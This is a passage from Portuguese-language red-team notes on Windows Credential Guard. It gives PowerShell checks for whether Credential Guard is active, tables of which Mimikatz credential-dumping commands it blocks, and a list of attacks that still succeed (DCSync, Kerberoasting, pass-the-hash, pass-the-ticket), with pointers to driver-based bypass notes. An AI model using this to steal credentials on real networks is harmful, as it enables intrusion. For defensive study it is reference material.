Get-Process lsaiso -ErrorAction SilentlyContinue   ; se presente = CG ativo
(Get-Process lsass).Modules | Where-Object {$_.ModuleName -eq "LsaIso.dll"}
```

### O que VTL 1 / Credential Guard Realmente Protege

| Item | Protegido? |
|------|-----------|
| Hash NTLM de sessão interativa | **Sim** — em lsaiso.exe, inacessível de VTL 0 |
| TGT Kerberos (chave de sessão) | **Sim** — cifrado por lsaiso.exe |
| `sekurlsa::logonpasswords` | **Bloqueado** — lsass não tem mais os hashes em plaintext |
| `sekurlsa::wdigest` | **Bloqueado** — WDigest também fica protegido |

### O que NÃO é Protegido pelo Credential Guard

| Ataque | Funciona? | Motivo |
|--------|-----------|--------|
| **DCSync** (`lsadump::dcsync`) | **Sim** | Usa replicação AD (MS-DRSR), não acesso ao lsass |
| **Kerberoasting** | **Sim** | TGS usa chave do serviço (domínio), não da sessão |
| **Pass-the-Hash pré-CG** | **Sim** | Hashes obtidos antes de CG ser ativado são válidos |
| **Pass-the-Ticket** | **Sim** | Tickets TGS em memória de VTL 0 ainda acessíveis |
| **Credenciais em outros processos** | **Sim** | CG protege apenas o LSA, não outros processos |
| **DPAPI** | **Parcial** | Master keys user-mode ainda na memória de LSASS em alguns cenários |
| **KDC response interception** | **Sim** | Em configs sem AS-REP roasting protection |

### Verificar Status do Credential Guard

```powershell
# Método 1: Win32_DeviceGuard WMI
Get-WmiObject -ClassName Win32_DeviceGuard `
    -Namespace root\Microsoft\Windows\DeviceGuard |
    Select SecurityServicesRunning, VirtualizationBasedSecurityStatus
# SecurityServicesRunning: 1 = Credential Guard, 2 = HVCI

# Método 2: Registry
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
    -Name EnableVirtualizationBasedSecurity
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name LsaCfgFlags
# LsaCfgFlags: 1 = Credential Guard ativo; 2 = Credential Guard + Lock (sem desabilitar via registry)

# Método 3: Verificar processo lsaiso.exe
Get-Process lsaiso -ErrorAction SilentlyContinue
```

---

## Módulos Relacionados

`01_byovd_drivers_vulneraveis.md` fornece o vetor de BYOVD necessário para bypass de PPL do `lsaiso` — sem Ring 0, não há como desproteger o processo guardião. `../09_active_directory/10_adcs_attacks.md` cobre ataques ADCS (ESC1, ESC4) que funcionam mesmo com Credential Guard ativo, pois os tickets Kerberos ainda residem em VTL 0. `../09_active_directory/02_kerberoasting_e_asrep.md` confirma que Kerberoasting segue operacional com CG — os TGTs estão acessíveis via LSASS em VTL 0 mesmo que os hashes NT estejam em VTL 1. ATT&CK T1003.001 (LSASS Memory), T1558.003 (Kerberoasting) e T1552.004 (DPAPI) mapeiam as técnicas desta nota.
- T1649 — Steal or Forge Authentication Certificates
